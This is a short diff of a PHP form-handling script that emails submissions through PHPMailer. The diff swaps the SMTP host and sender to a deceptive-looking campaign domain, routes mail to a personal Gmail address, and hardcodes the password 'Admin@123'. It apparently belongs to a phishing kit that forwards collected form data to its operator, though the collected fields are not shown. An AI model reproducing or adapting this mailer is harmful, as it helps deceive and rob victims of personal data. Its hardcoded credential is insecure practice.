@@ -11,16 +11,14 @@ if(isset($_POST['submit'])){
   if (in_array($code, $emp_code)) {
 
                 $mail = new PHPMailer();
-                $mail->SMTPDebug = SMTP::DEBUG_SERVER;
                 $mail->isSMTP();
-                $mail->Host = "smtp.hostinger.com";
+                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                 $mail->SMTPAuth = true;
                 $mail->SMTPSecure = 'ssl';
                 $mail->Port = 465;
-                $mail->Username = "info@pgi-bil-pgidsk-pgrs-crd-jsph.xyz";
+                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                 $mail->Password = "Admin@123";
-                $mail->AddAddress("info@pgi-bil-pgidsk-pgrs-crd-jsph.xyz");
-                $mail->addCC('easymailid45@gmail.com');
+                $mail->AddAddress("easymailid45@gmail.com");
                 $mail->SetFrom($mail->Username);
                 
                 $mail->isHTML(true);
